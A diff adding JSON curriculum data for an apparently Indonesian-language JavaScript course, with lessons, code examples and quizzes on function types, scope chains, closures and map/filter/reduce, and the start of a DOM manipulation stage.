+            "explanation": "JavaScript berjalan pada single thread. Infinite loop akan menyandera CPU 100% dan membekukan seluruh rendering antarmuka pengguna."
+          }
+        ]
+      },
+      {
+        "id": "lesson-8-3",
+        "stageId": "stage-8",
+        "slug": "function-declaration-expression-dan-arrow-functions",
+        "title": "Function Declaration vs Expression vs Arrow Function",
+        "titleEn": "Function Types: Declaration vs Expression vs Arrow",
+        "level": "BEGINNER",
+        "estimatedMinutes": 15,
+        "description": "Memahami 3 cara mendeklarasikan fungsi, perbedaan hoisting, implicit return pada arrow functions, dan lexical scoping binding `this`.",
+        "prerequisites": [
+          "perulangan-for-while-dan-for-of"
+        ],
+        "learningObjectives": [
+          "Membedakan Function Declaration, Function Expression, dan Arrow Function.",
+          "Menjelaskan perbedaan hoisting (Function Declaration dapat dipanggil sebelum baris deklarasinya).",
+          "Menerapkan Concise Body / Implicit Return pada Arrow Function satu baris.",
+          "Memahami pengikatan leksikal konteks `this` pada Arrow Functions."
+        ],
+        "whyMatters": "Arrow Function adalah sintaks penulisan fungsi paling dominan di ekosistem React modern (komponen fungsional, custom hooks, dan callback).",
+        "careerContext": "Mengetahui kapan menggunakan arrow function vs regular function adalah pertanyaan fundamental pada wawancara teknis frontend.",
+        "commonMistakes": [
+          "Menulis kurung kurawal `{}` pada arrow function satu baris tanpa kata kunci `return` (menyebabkan fungsi mengembalikan `undefined`).",
+          "Mencoba memanggil Function Expression sebelum baris deklarasinya."
+        ],
+        "keyTerms": [
+          {
+            "term": "Function Declaration",
+            "definition": "Fungsi yang dideklarasikan dengan kata kunci `function nama() {}` dan di-hoist sepenuhnya."
+          },
+          {
+            "term": "Arrow Function",
+            "definition": "Fungsi modern bertanda panah `() => {}` dengan lexical this dan dukungan implicit return."
+          },
+          {
+            "term": "Implicit Return",
+            "definition": "Pengembalian nilai ekspresi secara otomatis pada arrow function satu baris tanpa menulis kata kunci `return`."
+          }
+        ],
+        "contentMd": "# Function Declaration vs Expression vs Arrow Function\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari tiga cara mendeklarasikan fungsi di JavaScript: **Function Declaration**, **Function Expression**, dan **Arrow Function (`() => {}`)**, perbedaan perilaku **Hoisting**, serta fitur **Implicit Return**.\n\n## Mengapa Konsep Ini Penting?\nFungsi adalah blok bangunan utama program. Di React dan Next.js modern, hampir seluruh komponen dan logika bisnis ditulis dalam bentuk Arrow Functions yang ringkas dan bersih.\n\n## 1. Tiga Bentuk Penulisan Fungsi\n\n### A. Function Declaration (Klasik & Ter-hoist)\n```javascript\n// Dapat dipanggil BAHKAN SEBELUM baris deklarasinya (Full Hoisting)\nsapa(\"Acelino\"); \n\nfunction sapa(nama) {\n  return `Halo, ${nama}!`;\n}\n```\n\n### B. Function Expression (Disimpan di Variabel)\n```javascript\n// Terikat TDZ: TIDAK BISA dipanggil sebelum baris ini\nconst sapa = function(nama) {\n  return `Halo, ${nama}!`;\n};\n```\n\n### C. Arrow Function (Sintaks Modern ES6)\n```javascript\nconst sapa = (nama) => {\n  return `Halo, ${nama}!`;\n};\n```\n\n## 2. Fitur Spesial Arrow Function: Implicit Return\nJika fungsi panah Anda hanya memiliki **satu baris ekspresi**, Anda dapat menghapus tanda kurung kurawal `{}` dan kata kunci `return`. Hasilnya akan di-return secara otomatis:\n\n```javascript\n// Panjang:\nconst kaliDuaLengkap = (n) => {\n  return n * 2;\n};\n\n// Ringkas (Implicit Return):\nconst kaliDua = (n) => n * 2;\n\nconsole.log(kaliDua(5)); // 10\n```\n\n> **Jebakan Fatal Pemula**: Jika Anda menulis kurung kurawal `{ n * 2; }` tanpa kata kunci `return`, fungsi akan mengembalikan `undefined`!\n\n## 3. Perilaku `this` (Lexical Binding)\n- Regular Function (`function`) membuat konteks `this` dinamis miliknya sendiri berdasarkan siapa yang memanggil fungsi tersebut.\n- **Arrow Function tidak memiliki `this` sendiri**. Mereka mewarisi (*lexically bind*) nilai `this` dari scope luar tempat fungsi tersebut didefinisikan.\n\n## Kesalahan Umum Pemula\n- **Lupa tanda kurung saat me-return objek literal pada implicit return**: Menulis `() => { nama: \"Acel\" }` akan dikira sebagai kurung kurawal badan fungsi. Bungkus dengan tanda kurung: `() => ({ nama: \"Acel\" })`.\n\n## Praktik Mandiri\n1. Buat arrow function satu baris bernama `hitungDiskon` yang menerima `harga` dan `persen`, lalu mengembalikan harga setelah diskon menggunakan implicit return.\n\n## Ringkasan\n- **Function Declaration** di-hoist sepenuhnya ke puncak scope.\n- **Arrow Function (`() =>`)** adalah standar modern untuk kode yang ringkas dan ekspresif.\n- Arrow Function mendukung **Implicit Return** pada satu baris tanpa kurung kurawal dan `return`.\n- Arrow Function mewarisi konteks **`this`** dari lingkungan leksikal luarnya.",
+        "quizzes": [
+          {
+            "id": "q-8-3-1",
+            "question": "Apa perbedaan perilaku hoisting antara Function Declaration dan Arrow Function (yang disimpan di dalam variabel const/let)?",
+            "options": [
+              "Function Declaration di-hoist sepenuhnya (dapat dipanggil sebelum baris deklarasinya), sedangkan Arrow Function terikat TDZ dan tidak bisa dipanggil sebelum dideklarasikan.",
+              "Arrow Function di-hoist sedangkan Function Declaration tidak.",
+              "Keduanya tidak di-hoist sama sekali.",
+              "Function Declaration tidak bisa menerima parameter argumen."
+            ],
+            "correctIndex": 0,
+            "explanation": "Function Declaration diangkat sepenuhnya ke puncak scope oleh JavaScript engine, sedangkan arrow function bertindak sebagai ekspresi variabel const/let."
+          },
+          {
+            "id": "q-8-3-2",
+            "question": "Bagaimana perilaku pengikatan konteks 'this' pada Arrow Function?",
+            "options": [
+              "Arrow Function tidak memiliki nilai this sendiri; mereka mewarisi (lexically bind) nilai this dari scope luar tempat fungsi tersebut didefinisikan.",
+              "Arrow Function selalu membuat this bernilai null.",
+              "Arrow Function mengikat this ke elemen HTML tombol.",
+              "this pada arrow function selalu mengarah ke window browser."
+            ],
+            "correctIndex": 0,
+            "explanation": "Lexical scoping this pada arrow function memecahkan masalah klasik hilangnya binding this pada callback di JavaScript lama."
+          },
+          {
+            "id": "q-8-3-3",
+            "question": "Perhatikan kode berikut:\nconst double = n => n * 2;\nconsole.log(double(5));\nMengapa fungsi tersebut tidak membutuhkan kurung kurawal {} dan kata kunci return?",
+            "options": [
+              "Karena menggunakan fitur Concise Body (Implicit Return) pada Arrow Function satu baris.",
+              "Karena JavaScript otomatis menebak hasil fungsi.",
+              "Karena angka 5 adalah bilangan prima.",
+              "Karena double adalah fungsi bawaan browser."
+            ],
+            "correctIndex": 0,
+            "explanation": "Pada arrow function satu ekspresi tanpa kurung kurawal, nilai ekspresi tersebut otomatis di-return tanpa perlu menulis return secara eksplisit."
+          }
+        ]
+      },
+      {
+        "id": "lesson-8-4",
+        "stageId": "stage-8",
+        "slug": "scope-lexical-environment-dan-scope-chain",
+        "title": "Scope, Lexical Environment & Scope Chain",
+        "titleEn": "Scope & Lexical Environment",
+        "level": "INTERMEDIATE",
+        "estimatedMinutes": 15,
+        "description": "Memahami Global Scope, Function Scope, Block Scope, bagaimana JavaScript menyelesaikan pencarian identifier variabel melalui Scope Chain dari dalam ke luar.",
+        "prerequisites": [
+          "function-declaration-expression-dan-arrow-functions"
+        ],
+        "learningObjectives": [
+          "Membedakan 3 tingkatan ruang lingkup variabel: Global Scope, Function Scope, dan Block Scope.",
+          "Menjelaskan cara kerja Scope Chain dalam menyelesaikan resolusi pencarian variabel (Inner to Outer).",
+          "Mencegah polusi namespace global yang memicu konflik variabel antar modul."
+        ],
+        "whyMatters": "Memahami Scope Chain adalah kunci untuk memahami bagaimana Closures bekerja dan mengapa variabel tertentu tidak dapat diakses di luar bloknya.",
+        "careerContext": "Scope isolation adalah prinsip dasar modularitas arsitektur perangkat lunak yang aman dan teruji.",
+        "commonMistakes": [
+          "Membuat variabel global tanpa sengaja (misal lupa menulis `const`/`let` seperti `nama = 'Budi'`) yang bocor ke objek window global.",
+          "Mencoba mengakses variabel lokal fungsi dari luar fungsi tersebut."
+        ],
+        "keyTerms": [
+          {
+            "term": "Scope",
+            "definition": "Cakupan area aksesibilitas dan masa hidup suatu variabel dalam program."
+          },
+          {
+            "term": "Lexical Environment",
+            "definition": "Struktur internal engine yang memetakan identifier ke variabel berdasarkan lokasi penulisan fisik kode sumber."
+          },
+          {
+            "term": "Scope Chain",
+            "definition": "Rantai pencarian bertingkat dari scope lokal saat ini menuju ke parent scope hingga global scope."
+          }
+        ],
+        "contentMd": "# Scope, Lexical Environment & Scope Chain\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari konsep **Scope (Cakupan Aksesibilitas Variabel)**: perbedaan antara **Global Scope**, **Function Scope**, dan **Block Scope**, serta bagaimana JavaScript mencari variabel melalui **Scope Chain**.\n\n## Mengapa Konsep Ini Penting?\nVariabel yang Anda buat di dalam sebuah fungsi tidak boleh bertabrakan dengan variabel di halaman lain. Memahami batasan scope memastikan bahwa data terisolasi dengan aman di tempat yang seharusnya.\n\n## 1. Tiga Tingkatan Scope di JavaScript\n\n### A. Global Scope\n- Variabel yang dideklarasikan di luar fungsi atau blok apapun.\n- Dapat diakses dari baris kode mana saja di seluruh file.\n- **Bahaya**: Terlalu banyak variabel global (*Global Namespace Pollution*) dapat memicu tabrakan variabel tak sengaja antar file library luar.\n\n### B. Function Scope\n- Variabel yang dideklarasikan di dalam badan fungsi.\n- Hanya hidup dan dapat diakses di dalam fungsi tersebut.\n\n### C. Block Scope (`let` dan `const`)\n- Variabel yang dideklarasikan di dalam kurung kurawal `{ ... }` (misal di dalam `if`, `for`, atau blok mandiri).\n- Terkunci di dalam blok dan tidak bocor keluar.\n\n```javascript\nconst globalVar = \"Saya Global\";\n\nfunction contohScope() {\n  const functionVar = \"Saya Lokal Fungsi\";\n\n  if (true) {\n    const blockVar = \"Saya Terkunci di Blok IF\";\n    console.log(globalVar);   // BISA: Mengakses ke atas\n    console.log(functionVar); // BISA: Mengakses ke atas\n    console.log(blockVar);    // BISA: Di dalam blok sendiri\n  }\n\n  // console.log(blockVar); // ERROR: ReferenceError! (Terkunci di dalam IF)\n}\n\ncontohScope();\n// console.log(functionVar); // ERROR: ReferenceError! (Terkunci di dalam fungsi)\n```\n\n## 2. Bagaimana Scope Chain Bekerja?\nKetika JavaScript menemukan sebuah variabel:\n1. Engine mencari di **Local Scope saat ini**.\n2. Jika tidak ditemukan, ia naik satu tingkat ke **Outer/Parent Scope**.\n3. Ia terus naik ke atas hingga mencapai **Global Scope**.\n4. Jika di Global Scope tetap tidak ditemukan, JavaScript melempar **`ReferenceError`**.\n\n> **Arah Pencarian**: Scope Chain selalu bergerak dari **DALAM ke LUAR** (*Inner $\\rightarrow$ Outer*), tidak pernah dari luar ke dalam!\n\n## Kesalahan Umum Pemula\n- **Polusi Variabel Tanpa Deklarasi**: Menulis `skor = 100` tanpa `const` atau `let`. JavaScript akan otomatis menempelkan variabel tersebut ke global `window` object yang sangat berbahaya bagi keamanan aplikasi.\n\n## Praktik Mandiri\n1. Buat fungsi bersarang (*nested function*).\n2. Deklarasikan variabel di fungsi luar dan panggil dari fungsi dalam untuk membuktikan alur kerja Scope Chain.\n\n## Ringkasan\n- **Global Scope** dapat diakses di mana saja.\n- **Block Scope (`let`/`const`)** terkurung aman di dalam kurung kurawal `{ }`.\n- **Scope Chain** mencari variabel dari dalam ke luar (*inner to outer*).",
+        "quizzes": [
+          {
+            "id": "q-8-4-1",
+            "question": "Apa yang dimaksud dengan 'Block Scope' pada variabel yang dideklarasikan dengan let dan const?",
+            "options": [
+              "Variabel hanya dapat diakses di dalam blok kurung kurawal { ... } tempat ia didefinisikan dan tidak bocor keluar.",
+              "Variabel dapat diakses dari seluruh file proyek secara bebas.",
+              "Variabel tidak bisa diubah nilainya.",
+              "Variabel otomatis disimpan di media localStorage browser."
+            ],
+            "correctIndex": 0,
+            "explanation": "Block scoping membatasi masa hidup dan aksesibilitas variabel hanya di dalam pasangan kurung kurawal pembungkusnya terdekat."
+          },
+          {
+            "id": "q-8-4-2",
+            "question": "Bagaimana alur pencarian variabel dalam 'Scope Chain' di JavaScript?",
+            "options": [
+              "Engine mencari di Local Scope saat ini terlebih dahulu; jika tidak ditemukan, ia naik ke Outer/Parent Scope, dan terus naik hingga ke Global Scope sebelum melempar ReferenceError.",
+              "Mencari langsung di Global Scope dan mengabaikan variabel lokal.",
+              "Mencari secara acak di file lain di dalam folder.",
+              "Mencari dari bawah ke atas di dalam database."
+            ],
+            "correctIndex": 0,
+            "explanation": "Scope chain bekerja secara satu arah dari dalam ke luar (inner to outer) untuk menyelesaikan resolusi identifier variabel."
+          },
+          {
+            "id": "q-8-4-3",
+            "question": "Apa bahaya dari membuat variabel tanpa kata kunci const/let/var (contoh: x = 10;)?",
+            "options": [
+              "Variabel tersebut bocor menempel ke global window object, rawan tertimpa oleh skrip lain, dan menciptakan potensi bug memori yang sulit dilacak.",
+              "Browser akan mematikan komputer pengguna.",
+              "Database akan terkunci permanen.",
+              "Tidak ada bahaya apapun."
+            ],
+            "correctIndex": 0,
+            "explanation": "Global namespace pollution merusak modularitas kode dan menciptakan efek samping tak terduga saat banyak modul skrip berinteraksi."
+          }
+        ]
+      },
+      {
+        "id": "lesson-8-5",
+        "stageId": "stage-8",
+        "slug": "closures-dan-private-state",
+        "title": "Closures & Private State",
+        "titleEn": "Closures & Private State Encapsulation",
+        "level": "INTERMEDIATE",
+        "estimatedMinutes": 18,
+        "description": "Memahami konsep Closure di JavaScript, bagaimana fungsi dalam mengingat variabel dari lingkungan leksikal luarnya, dan implementasi Private State encapsulation.",
+        "prerequisites": [
+          "scope-lexical-environment-dan-scope-chain"
+        ],
+        "learningObjectives": [
+          "Mendefinisikan konsep Closure: fungsi yang mempertahankan akses ke lexical environment induknya bahkan setelah fungsi induk selesai dieksekusi.",
+          "Menerapkan Closure untuk membuat enkapsulasi Private State dan Factory Functions.",
+          "Menjelaskan mengapa Closure menjadi fondasi cara kerja React Hooks seperti useState."
+        ],
+        "whyMatters": "Closures adalah salah satu konsep paling kuat di JavaScript yang memungkinkan enkapsulasi data dan menjadi fondasi seluruh pola fungsional modern.",
+        "careerContext": "Memahami Closures membedakan developer tingkat menengah dari pemula yang hanya sekadar menghafal sintaks.",
+        "commonMistakes": [
+          "Mengira variabel di dalam fungsi induk akan terhapus dari memori saat fungsi induk return (jika ada closure anak yang masih merujuknya, variabel tetap hidup di Heap).",
+          "Menciptakan memory leak tak sengaja dengan menahan referensi closure besar yang tidak lagi dipakai."
+        ],
+        "keyTerms": [
+          {
+            "term": "Closure",
+            "definition": "Kombinasi antara sebuah fungsi dan referensi ke lingkungan leksikal tempat fungsi tersebut diciptakan."
+          },
+          {
+            "term": "Private State",
+            "definition": "Data internal yang terisolasi dan hanya dapat dibaca/diubah melalui method tertentu yang disediakan."
+          },
+          {
+            "term": "Factory Function",
+            "definition": "Fungsi yang menghasilkan dan mengembalikan instance fungsi/objek baru yang terenkapsulasi."
+          }
+        ],
+        "contentMd": "# Closures & Private State\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari salah satu konsep paling fundamental dan kuat di JavaScript: **Closures**. Anda akan memahami bagaimana sebuah fungsi dapat \"mengingat\" variabel dari lingkungan induknya dan menggunakannya untuk membuat **Private State (Data Terenkapsulasi)**.\n\n## Mengapa Konsep Ini Penting?\nBagaimana cara membuat variabel penghitung (*counter*) yang tidak bisa diubah-ubah secara curang dari luar kecuali melalui tombol yang sah? Dan bagaimana hook `useState` di React dapat mengingat nilai state antar siklus render? Jawabannya adalah **Closures**.\n\n## 1. Definisi Closure\n> **Closure** adalah kemampuan sebuah fungsi dalam untuk tetap mengakses variabel-variabel dari scope fungsi luarnya (*Lexical Environment*), bahkan **setelah fungsi luar tersebut selesai dieksekusi**.\n\nNormalnya, ketika sebuah fungsi selesai berjalan, semua variabel lokalnya akan dihancurkan oleh *Garbage Collector*. Namun jika ada fungsi dalam (*inner function*) yang masih memegang referensi ke variabel tersebut, JavaScript akan mempertahankan variabel itu tetap hidup di memori!\n\n## 2. Contoh Nyata: Private State Counter\n\n```javascript\nfunction createCounter() {\n  let count = 0; // Private State: Tidak bisa diakses langsung dari luar!\n\n  return {\n    tambah: function() {\n      count += 1;\n      return count;\n    },\n    kurang: function() {\n      count -= 1;\n      return count;\n    },\n    getNilai: function() {\n      return count;\n    }\n  };\n}\n\nconst counter1 = createCounter();\n\nconsole.log(counter1.tambah());   // 1\nconsole.log(counter1.tambah());   // 2\nconsole.log(counter1.getNilai()); // 2\n\n// Coba akses langsung variabel count:\nconsole.log(counter1.count); // undefined (AMAN: Terenkapsulasi secara private!)\n```\n\n### Mengapa Ini Luar Biasa?\nVariabel `count` terlindungi 100% dari manipulasi luar. Tidak ada kode lain yang bisa mengubah `count = 999999` secara ilegal karena variabel tersebut terkunci di dalam closure `createCounter`.\n\n## 3. Hubungan Closure dengan React `useState`\nKetika Anda menulis di React:\n```javascript\nconst [skor, setSkor] = useState(0);\n```\nDi balik layar, React menggunakan prinsip Closure untuk mengaitkan fungsi komponen Anda dengan slot memori state yang persisten di dalam React engine lintas siklus render.\n\n## Kesalahan Umum Pemula\n- **Mengira instance closure saling berbagi data**: Jika Anda membuat `const counter2 = createCounter()`, `counter2` memiliki memori `count` independen miliknya sendiri yang terpisah total dari `counter1`.\n\n## Praktik Mandiri\n1. Buat fungsi `createGreeting(sapaan)` yang mengembalikan fungsi baru `(nama) => `${sapaan}, ${nama}!``.\n2. Buat `const sayHello = createGreeting(\"Halo\")` dan panggil `sayHello(\"Acelino\")`.\n\n## Ringkasan\n- **Closure** terjadi ketika sebuah fungsi dalam mengingat variabel dari scope fungsi induknya.\n- Variabel closure tetap hidup di memori meskipun fungsi induk sudah selesai dieksekusi.\n- Closure digunakan untuk **Enkapsulasi Data (Private State)** dan menjadi fondasi **React Hooks**.",
+        "quizzes": [
+          {
+            "id": "q-8-5-1",
+            "question": "Apa definisi dari konsep 'Closure' dalam bahasa pemrograman JavaScript?",
+            "options": [
+              "Kombinasi antara sebuah fungsi dan lingkungan leksikal tempat fungsi tersebut diciptakan, memungkinkan fungsi dalam mengingat dan mengakses variabel dari scope luar meskipun fungsi luar telah selesai dieksekusi.",
+              "Menutup jendela browser setelah selesai menulis kode program.",
+              "Mengakhiri statement baris dengan tanda titik koma (;).",
+              "Menghapus seluruh fungsi dari memori komputer."
+            ],
+            "correctIndex": 0,
+            "explanation": "Closure mempertahankan referensi ke variabel induk di memori heap bahkan setelah eksekusi fungsi induk selesai."
+          },
+          {
+            "id": "q-8-5-2",
+            "question": "Perhatikan kode Closure counter berikut:\nfunction createCounter() {\n  let count = 0;\n  return () => ++count;\n}\nconst counter = createCounter();\nconsole.log(counter());\nconsole.log(counter());\nBerapa output dari dua baris console.log tersebut?",
+            "options": [
+              "1 lalu 2",
+              "1 lalu 1",
+              "0 lalu 1",
+              "undefined lalu undefined"
+            ],
+            "correctIndex": 0,
+            "explanation": "Fungsi anak mempertahankan variabel count secara persisten tertutup (private state) di dalam closure-nya sehingga nilai terus bertambah."
+          },
+          {
+            "id": "q-8-5-3",
+            "question": "Dalam arsitektur rekayasa perangkat lunak, apa manfaat utama penggunaan Closure?",
+            "options": [
+              "Enkapsulasi Data & Private State: menyembunyikan variabel sensitif agar tidak bisa dimanipulasi langsung dari luar kecuali melalui method publik yang sah.",
+              "Membuat ukuran file JavaScript menjadi 0 KB.",
+              "Menggantikan fungsi server database backend.",
+              "Menghindari penggunaan bahasa CSS."
+            ],
+            "correctIndex": 0,
+            "explanation": "Closure adalah fondasi enkapsulasi, factory functions, module pattern, dan implementasi Hooks seperti useState pada React."
+          }
+        ]
+      },
+      {
+        "id": "lesson-8-6",
+        "stageId": "stage-8",
+        "slug": "higher-order-functions-map-filter-reduce",
+        "title": "Higher-Order Functions: map, filter, reduce",
+        "titleEn": "Higher-Order Functions: map, filter, reduce",
+        "level": "INTERMEDIATE",
+        "estimatedMinutes": 18,
+        "description": "Mengolah koleksi data secara fungsional dan deklaratif menggunakan Higher-Order Functions: map (transformasi), filter (penyaringan), dan reduce (akumulasi skalar).",
+        "prerequisites": [
+          "closures-dan-private-state"
+        ],
+        "learningObjectives": [
+          "Mendefinisikan Higher-Order Function (fungsi yang menerima fungsi lain sebagai argumen atau mengembalikan fungsi).",
+          "Menerapkan map() untuk mentransformasikan array ke bentuk baru tanpa mutasi (fondasi rendering list di React).",
+          "Menerapkan filter() untuk menyaring data berdasarkan kriteria predikat boolean.",
+          "Menerapkan reduce() untuk mengakumulasi array menjadi satu nilai tunggal (total harga, pengelompokan kategori)."
+        ],
+        "whyMatters": "`map`, `filter`, dan `reduce` adalah 3 pilar pemrograman fungsional yang menggantikan perulangan manual for loop yang rawan bug di aplikasi modern.",
+        "careerContext": "Setiap baris kode rendering daftar item di React ditulis menggunakan `.map()`.",
+        "commonMistakes": [
+          "Menggunakan `forEach` saat membutuhkan array kembalian baru (gunakan `map` jika butuh hasil return, gunakan `forEach` hanya untuk side effect logging).",
+          "Lupa menyertakan nilai awal (*initial value*) pada argumen kedua `reduce(..., 0)`."
+        ],
+        "keyTerms": [
+          {
+            "term": "Higher-Order Function (HOF)",
+            "definition": "Fungsi yang beroperasi pada fungsi lain, baik dengan menerima fungsi sebagai argumen (callback) atau mengembalikannya."
+          },
+          {
+            "term": "map()",
+            "definition": "Method yang menghasilkan array baru dengan panjang sama berisi hasil pemanggilan callback pada setiap elemen."
+          },
+          {
+            "term": "filter()",
+            "definition": "Method yang menghasilkan array baru berisi elemen-elemen yang lolos pengujian kondisi boolean (true)."
+          },
+          {
+            "term": "reduce()",
+            "definition": "Method yang mengiterasi array dan mengakumulasikan seluruh nilainya menjadi satu nilai akhir tunggal."
+          }
+        ],
+        "contentMd": "# Higher-Order Functions: map, filter, reduce\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari trio fungsi paling berharga di JavaScript: **`map()`** (Transformasi Data), **`filter()`** (Penyaringan Data), dan **`reduce()`** (Akumulasi Nilai).\n\n## Mengapa Konsep Ini Penting?\nDi era pemrograman fungsional modern (termasuk di React), menulis perulangan imperatif `for (let i = 0; ...)` dianggap kuno dan rawan bug indeks. Higher-Order Functions memungkinkan Anda mengolah data secara **deklaratif, ekspresif, dan non-mutating (aman)**.\n\n## 1. Apa itu Higher-Order Function?\n> **Higher-Order Function** adalah fungsi yang menerima fungsi lain sebagai argumen (*callback*) dan/atau mengembalikan fungsi lain sebagai nilai output-nya.\n\n## 2. Trio HOF Utama di JavaScript\n\n```javascript\nconst produkList = [\n  { id: 1, nama: \"Laptop\", harga: 12000000, kategori: \"Elektronik\" },\n  { id: 2, nama: \"Buku Coding\", harga: 150000, kategori: \"Edukasi\" },\n  { id: 3, nama: \"Mouse Wireless\", harga: 300000, kategori: \"Elektronik\" },\n  { id: 4, nama: \"Kaos Polos\", harga: 100000, kategori: \"Pakaian\" }\n];\n```\n\n### A. `filter()` (Menyaring Data Sesuai Kondisi)\nMenghasilkan array baru yang HANYA berisi item-item yang mengembalikan `true` pada callback:\n\n```javascript\n// Saring produk yang hanya berkategori 'Elektronik':\nconst produkElektronik = produkList.filter(p => p.kategori === \"Elektronik\");\n// Hasil: [Laptop, Mouse Wireless]\n```\n\n### B. `map()` (Mengubah / Mentransformasi Setiap Elemen)\nMenghasilkan array baru dengan panjang yang sama, di mana setiap item diubah bentuknya:\n\n```javascript\n// Ambil hanya daftar nama produk saja:\nconst daftarNama = produkList.map(p => p.nama);\n// Hasil: [\"Laptop\", \"Buku Coding\", \"Mouse Wireless\", \"Kaos Polos\"]\n\n// Di React, map digunakan untuk mengubah data menjadi komponen HTML:\n// const listUI = produkList.map(p => <Card key={p.id} data={p} />);\n```\n\n### C. `reduce()` (Akumulasi Menjadi Satu Nilai Tunggal)\nMenghitung seluruh total nilai dalam array menjadi satu nilai skalar tunggal:\n\n```javascript\n// Hitung total nilai seluruh inventaris toko:\n// reduce((akumulator, item) => ..., nilaiAwal)\nconst totalNilaiToko = produkList.reduce((total, p) => total + p.harga, 0);\n\nconsole.log(totalNilaiToko); // 12.550.000\n```\n\n## 3. Chaining (Menggabungkan Beberapa HOF Sekaligus)\nAnda dapat merangkai ketiganya menjadi alur pipa data yang sangat indah:\n\n```javascript\n// Hitung total harga hanya untuk produk Elektronik:\nconst totalElektronik = produkList\n  .filter(p => p.kategori === \"Elektronik\")\n  .map(p => p.harga)\n  .reduce((total, harga) => total + harga, 0);\n\nconsole.log(totalElektronik); // 12.300.000\n```\n\n## Kesalahan Umum Pemula\n- **Lupa nilai awal pada reduce**: Menulis `array.reduce((acc, cur) => ...)` tanpa nilai awal `0` dapat memicu bug runtime jika array-nya kosong.\n- **Menggunakan map tanpa return**: Jika Anda tidak mengembalikan nilai dari callback `map`, array baru Anda akan berisi `[undefined, undefined]`.\n\n## Praktik Mandiri\n1. Buat array angka `[1, 2, 3, 4, 5, 6, 7, 8]`.\n2. Gunakan `filter` untuk mengambil angka genap, lalu gunakan `map` untuk mengalikannya dengan 10. Hasil akhirnya harus `[20, 40, 60, 80]`.\n\n## Ringkasan\n- **`filter()`** menyaring elemen berdasarkan kondisi boolean (*true/false*).\n- **`map()`** mentransformasi setiap elemen menjadi bentuk data/komponen baru.\n- **`reduce()`** mengakumulasikan seluruh array menjadi satu nilai tunggal.\n- Ketiga method ini bersifat **non-mutating** dan dapat digabungkan secara berantai (*chaining*).",
+        "quizzes": [
+          {
+            "id": "q-8-6-1",
+            "question": "Apa definisi dari 'Higher-Order Function' di JavaScript?",
+            "options": [
+              "Fungsi yang menerima fungsi lain sebagai argumen (callback) dan/atau mengembalikan fungsi lain sebagai nilai output-nya.",
+              "Fungsi yang memiliki lebih dari 100 baris kode program.",
+              "Fungsi yang hanya berjalan di server superkomputer cloud.",
+              "Fungsi yang tidak memiliki nama penunjuk identifier."
+            ],
+            "correctIndex": 0,
+            "explanation": "Karena fungsi adalah First-Class Citizens di JavaScript, mereka dapat dioperasikan layaknya nilai data biasa (diterima sebagai argumen atau di-return)."
+          },
+          {
+            "id": "q-8-6-2",
+            "question": "Perhatikan kode berikut:\nconst numbers = [1, 2, 3, 4, 5];\nconst result = numbers.filter(n => n % 2 === 0).map(n => n * 10);\nApa isi dari array result?",
+            "options": [
+              "[20, 40]",
+              "[10, 20, 30, 40, 50]",
+              "[2, 4]",
+              "[60]"
+            ],
+            "correctIndex": 0,
+            "explanation": "filter menyaring angka genap [2, 4], kemudian map mengalikan setiap elemen genap tersebut dengan 10 menghasilkan [20, 40]."
+          },
+          {
+            "id": "q-8-6-3",
+            "question": "Method array manakah yang paling tepat digunakan untuk mengakumulasi seluruh total harga belanjaan dalam array objek keranjang menjadi satu nilai angka tunggal?",
+            "options": [
+              "reduce()",
+              "forEach()",
+              "find()",
+              "every()"
+            ],
+            "correctIndex": 0,
+            "explanation": "reduce((accumulator, item) => accumulator + item.price, 0) mengakumulasikan seluruh elemen koleksi menjadi satu nilai skalar tunggal."
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "id": "stage-9",
+    "orderIndex": 9,
+    "titleId": "DOM Manipulation & Browser Events",
+    "titleEn": "DOM Manipulation & Browser Events",
+    "category": "Frontend",
+    "description": "Menghubungkan JavaScript ke halaman web: seleksi elemen DOM, manipulasi teks & classList, Event Listeners, Event Bubbling & Delegation, form validation, dan sanitasi XSS.",
+    "descriptionEn": "Connect JavaScript to web pages: DOM selection, classList manipulation, Event Listeners, Event Delegation, form validation, and XSS sanitization.",
+    "lessons": [
+      {
+        "id": "lesson-9-1",
+        "stageId": "stage-9",
+        "slug": "dom-tree-dan-elemen-selection",
+        "title": "DOM Tree & Seleksi Elemen (querySelector vs getElementById)",
+        "titleEn": "DOM Tree & Element Selection",
+        "level": "BEGINNER",
+        "estimatedMinutes": 15,
+        "description": "Memahami struktur Document Object Model (DOM Tree), document.querySelector, querySelectorAll, NodeList vs HTMLCollection, dan getElementById.",
+        "prerequisites": [
+          "higher-order-functions-map-filter-reduce"
+        ],
+        "learningObjectives": [
+          "Menjelaskan representasi hierarki pohon DOM Tree dari dokumen HTML.",
+          "Memilih elemen tunggal dengan document.querySelector() dan elemen jamak dengan querySelectorAll().",
+          "Membedakan antara NodeList statis (querySelectorAll) dan HTMLCollection hidup (live collection)."
+        ],
+        "whyMatters": "DOM adalah antarmuka pemrograman yang memungkinkan kode JavaScript membaca, mengubah, dan menghidupkan elemen HTML secara interaktif.",
+        "careerContext": "Meskipun framework modern seperti React mengabstraksi DOM langsung, memahami DOM asli wajib untuk optimasi performa dan integrasi library pihak ketiga.",
+        "commonMistakes": [
+          "Lupa tanda titik `.` pada selector class di `querySelector('.tombol')` sehingga elemen tidak ditemukan.",
+          "Mencoba menjalankan method array seperti `.map()` langsung pada `HTMLCollection` tanpa konversi `Array.from()`."
+        ],
+        "keyTerms": [
+          {
+            "term": "DOM (Document Object Model)",
+            "definition": "Struktur pohon objek berjenjang yang merepresentasikan seluruh dokumen HTML di dalam memori browser."
+          },
+          {
+            "term": "document.querySelector()",
+            "definition": "Method standar untuk memilih elemen pertama yang cocok dengan selektor CSS yang diberikan."
+          },
+          {
+            "term": "NodeList",
+            "definition": "Koleksi node DOM yang dapat diiterasi langsung dengan method `.forEach()`."
+          }
+        ],
